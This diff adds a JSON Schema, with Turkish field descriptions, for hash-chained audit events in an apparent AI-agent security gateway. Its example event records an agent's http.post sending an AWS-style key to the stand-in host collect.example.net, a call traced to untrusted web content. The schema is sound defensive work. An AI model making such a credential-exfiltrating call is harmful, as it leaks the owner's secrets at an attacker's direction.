@@ -1,0 +1,132 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "$id": "https://agentgate.dev/schemas/event.schema.json",
+  "title": "Event",
+  "description": "Denetim kaydının tek birimi. Inspector ve proxy aynı şemayı üretir. Hash-chain alanları yazma anında store tarafından doldurulur.",
+  "type": "object",
+  "additionalProperties": false,
+  "required": ["id", "seq", "ts", "session_id", "actor", "type", "risk"],
+  "properties": {
+    "id": {
+      "type": "string",
+      "pattern": "^[0-9A-HJKMNP-TV-Z]{26}$",
+      "description": "ULID. Zaman sıralı, çakışmasız."
+    },
+    "seq": {
+      "type": "integer",
+      "minimum": 1,
+      "description": "Oturum içi monotonik sıra numarası."
+    },
+    "ts": { "type": "string", "format": "date-time" },
+    "session_id": { "type": "string", "minLength": 1 },
+    "parent_id": {
+      "type": ["string", "null"],
+      "description": "Nedensellik bağı: bu olayı tetikleyen önceki olay."
+    },
+    "actor": { "type": "string", "enum": ["agent", "user", "tool", "system"] },
+    "type": {
+      "type": "string",
+      "enum": [
+        "tool_call",
+        "tool_result",
+        "context_inject",
+        "approval",
+        "policy_decision",
+        "finding"
+      ]
+    },
+    "tool": { "type": ["string", "null"] },
+    "args": {
+      "type": ["object", "null"],
+      "description": "tool_call için normalize edilmiş argümanlar. Sırlar yazılmadan önce redakte edilir."
+    },
+    "provenance": {
+      "type": "array",
+      "items": { "$ref": "taint.schema.json#/$defs/TaintRef" },
+      "default": []
+    },
+    "capability": {
+      "oneOf": [
+        { "$ref": "capability.schema.json" },
+        { "type": "null" }
+      ]
+    },
+    "decision": {
+      "type": ["string", "null"],
+      "enum": ["allow", "deny", "approve", null],
+      "description": "Yetkilendirme sonucu. 'constrain' bir karar değil, allow'a eklenen kısıttır; kısıtlar constraints alanında taşınır."
+    },
+    "constraints": {
+      "type": "array",
+      "items": { "type": "object" },
+      "default": [],
+      "description": "Kazanan karara eklenen kısıtlar (redaksiyon, host yeniden yazımı, yol hapsi)."
+    },
+    "rule_id": { "type": ["string", "null"] },
+    "reason": {
+      "type": ["string", "null"],
+      "description": "İnsan dili gerekçe; UI'da gösterilir."
+    },
+    "risk": {
+      "type": "integer",
+      "minimum": 0,
+      "maximum": 100,
+      "description": "0-100 risk skoru. Politika motoru ve taint katmanı birlikte hesaplar."
+    },
+    "payload": {
+      "type": "object",
+      "description": "type'a özgü ek veri: context segmenti, onay cevabı, finding detayı.",
+      "additionalProperties": true
+    },
+    "prev_hash": {
+      "type": ["string", "null"],
+      "pattern": "^[a-f0-9]{64}$"
+    },
+    "hash": {
+      "type": ["string", "null"],
+      "pattern": "^[a-f0-9]{64}$",
+      "description": "sha256(canonical_json(event_without_hash) + prev_hash)."
+    }
+  },
+  "allOf": [
+    {
+      "if": { "properties": { "type": { "const": "tool_call" } } },
+      "then": { "required": ["tool", "capability"] }
+    },
+    {
+      "if": { "properties": { "type": { "const": "context_inject" } } },
+      "then": { "required": ["payload"] }
+    },
+    {
+      "if": { "properties": { "type": { "const": "policy_decision" } } },
+      "then": { "required": ["decision", "rule_id", "risk"] }
+    }
+  ],
+  "examples": [
+    {
+      "id": "01J8Z4Q2M9X7K3V5N1P8R6T4W2",
+      "seq": 7,
+      "ts": "2026-11-13T10:42:11Z",
+      "session_id": "sess_01J8Z4",
+      "parent_id": "01J8Z4Q2M9X7K3V5N1P8R6T4W1",
+      "actor": "agent",
+      "type": "tool_call",
+      "tool": "http.post",
+      "args": { "url": "https://collect.example.net/u", "body": "AKIA..." },
+      "provenance": [
+        {
+          "segment_id": "01J8Z4Q2M9X7K3V5N1P8R6T400",
+          "trust": "untrusted_web",
+          "source_ref": "https://blog.example.com/post",
+          "match": "shingle",
+          "score": 0.91
+        }
+      ],
+      "capability": { "kind": "net.egress", "target": "collect.example.net:443" },
+      "decision": null,
+      "rule_id": null,
+      "reason": null,
+      "risk": 88
+    }
+  ]
+}
